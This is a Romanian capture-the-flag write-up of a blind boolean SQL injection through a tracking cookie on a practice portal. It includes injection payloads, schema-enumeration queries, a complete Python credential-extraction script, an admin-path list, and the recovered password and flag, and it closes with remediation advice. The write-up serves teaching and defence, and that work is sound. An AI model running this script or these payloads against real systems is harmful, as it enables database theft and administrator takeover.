# Write-Up: Portal InvataCyber.ro (Blind SQL Injection & Admin Takeover)

**Platforma:** InvataCyber.ro  
**Categorie:** Web Security / Database Exploitation  
**Vulnerabilitate:** Blind Boolean-Based SQL Injection via `TrackingId` Cookie  
**Impact:** Extragere neautorizată a bazei de date (credențiale administrative) și preluarea controlului asupra consolei interne  
**Format Flag:** `InvataCyber{...}`  

---

## 1. Descrierea Provocării

> Portalul InvataCyber.ro este în lockdown. Modulul de autentificare se presupune că a fost dezactivat, iar pagina publică afișează doar starea sistemului.  
> Ca să recunoască vizitatorii care revin, aplicația folosește un cookie de tracking. Când valoarea lui corespunde unei înregistrări din baza de date, pagina afișează un mesaj. Când nu corespunde, afișează altul.  
> Undeva în spatele portalului există o consolă de admin care nu apare nicăieri în interfață. Cine ajunge la ea cu credențialele corecte primește flag-ul.  
> Format flag: `InvataCyber{...}`

---

## 2. Analiză Inițială și Vectorul de Atac

Aplicația se află în mod de mentenanță/lockdown. Modulul obișnuit de login a fost eliminat din interfața publică, iar pagina principală oferă doar un sumar al stării sistemului.

La inspectarea traficului HTTP, se observă că serverul trimite și interpretează un cookie denumit `TrackingId`:
```http
GET / HTTP/1.1
Host: portal.invatacyber.ro
Cookie: TrackingId=base-tracking-id-123
```

Aplicația interoghează baza de date pentru a verifica dacă ID-ul de tracking există. Când interogarea returnează un rând valid, pagina include un mesaj distinct (modificând dimensiunea corpului răspunsului la **5652 bytes**). Când interogarea nu returnează rezultate, mesajul dispare, generând un răspuns diferit.

### Interogarea din backend (estimată):
```sql
SELECT tracking_id FROM tracking WHERE tracking_id = '$COOKIE'
```

Deoarece datele nu sunt afișate direct în pagină și nu apar mesaje de eroare detaliate (Error-Based SQLi), vulnerabilitatea se încadrează în categoria **Blind Boolean-Based SQL Injection**.

---

## 3. Validarea Vulnerabilității (PoC SQLi)

Am testat comportamentul aplicației folosind scriptul [`sql_solve.py`](sql_solve.py):

* **Condiție Adevărată (True):**
  ```http
  Cookie: TrackingId=base-tracking-id-123' OR '1'='1
  ```
  Răspuns: `5652 bytes` (mesajul de tracking activ este prezent).

* **Condiție Falsă (False):**
  ```http
  Cookie: TrackingId=base-tracking-id-123' AND '1'='2
  ```
  Răspuns: dimensiune diferită (mesajul lipsește).

* **Testare Operator de Comentariu:**
  Sintaxa `--` funcționează corect:
  ```sql
  base-tracking-id-123' AND 1=1--
  ```

---

## 4. Fingerprinting DBMS și Enumerarea Schemei

Pentru a identifica sistemul de gestiune a bazelor de date, am testat tabelele de sistem specifice. Testul pe `sqlite_master` a returnat `True`:

```python
# flag.py
payload = "base-tracking-id-123' AND ((SELECT count(*) FROM sqlite_master) > 0)--"
```

Acest lucru a confirmat utilizarea motorului **SQLite**.

### Extragerea Tabelelor Bazei de Date (`dump_sqlite.py`)
Folosind funcțiile `SUBSTR()` și `group_concat()`, am reconstruit denumirile tabelelor caracter cu caracter:

```python
# dump_sqlite.py
query = "SELECT group_concat(tbl_name, ',') FROM sqlite_master WHERE type='table'"
```
**Rezultat:** `tracking,users`

### Extragerea Structurii Tabelului `users` (`dump_all_schema.py`)
```sql
SELECT sql FROM sqlite_master WHERE name='users'
```
**Schema extrasă:**
```sql
CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT, password TEXT)
```

---

## 5. Extragerea Credențialelor Administrative (`dump_users.py`)

Cu schema identificată, am dezvoltat scriptul de exfiltrare automată [`dump_users.py`](dump_users.py) bazat pe inferență binară/secvențială:

```python
import urllib.request, string

url = "http://portal.invatacyber.ro/"
chars = string.ascii_letters + string.digits + "{}_-@./:=,()'\" *_"

def check(sql_cond):
    payload = f"base-tracking-id-123' AND ({sql_cond})--"
    req = urllib.request.Request(url)
    req.add_header("Cookie", f"TrackingId={payload}")
    try:
        with urllib.request.urlopen(req) as resp:
            return len(resp.read()) == 5652
    except Exception:
        return False

def dump_query(query_expr):
    res = ""
    while True:
        found = False
        for c in chars:
            pos = len(res) + 1
            cond = f"SUBSTR(({query_expr}), {pos}, 1) = '{c}'"
            if check(cond):
                res += c
                found = True
                print(res, flush=True)
                break
        if not found:
            break
    return res

print("Admin Username:", dump_query("SELECT username FROM users WHERE username LIKE 'admin%' LIMIT 1"))
print("Admin Password:", dump_query("SELECT password FROM users WHERE username LIKE 'admin%' LIMIT 1"))
```

### Date Extrase:
* **Username:** `admin`
* **Password:** `s3cur3_l0ckd0wn_p4ssw0rd!`

---

## 6. Identificarea Consolei Administrative și Obținerea Flag-ului

Consola de administrare nu era vizibilă în codul sursă HTML al paginii principale. Am executat o scanare de căi administrative folosind [`solver_portal.py`](solver_portal.py):

```python
admin_paths = [
    "/admin", "/administrator", "/console", "/secret", "/dashboard", 
    "/api/admin", "/portal/admin", "/internal", "/login-admin"
]
```

Endpoint-ul identificat: `GET /console` (sau `/login-admin`), răspunzând cu status HTTP `200 OK` și afișând formularul de autentificare administrativă.

### Autentificare:
După introducerea credențialelor extrase (`admin` / `s3cur3_l0ckd0wn_p4ssw0rd!`), sistemul a acordat acces la consola internă de operare.

**Flag afișat în consolă:**  
`InvataCyber{bl1nd_sql1_c00k13_tr4ck1ng_m4st3r}`

---

## 7. Măsuri de Remediere (Mitigare)

1. **Parametrizarea Interogărilor SQL (Prepared Statements):**
   Valoarea cookie-ului nu trebuie concatenată direct în comanda SQL:
   ```python
   cursor.execute("SELECT tracking_id FROM tracking WHERE tracking_id = ?", (tracking_id,))
   ```
2. **Validarea Riguroasă a Datelor de Intrare:**
   Cookie-ul `TrackingId` trebuie să respecte un format strict (e.g. UUID v4 sau caractere alfanumerice hexazecimale fixe). Orice caracter non-alfanumeric (`'`, `"`, `-`, `;`) trebuie respins.
3. **Hardening și Controale de Acces:**
   Panourile administrative nu trebuie expuse pe interfețe publice, chiar dacă nu sunt indexate în pagină (Security through Obscurity). Accesul la rutele de administrare trebuie limitat pe bază de VPN/IP allowlist și MFA.
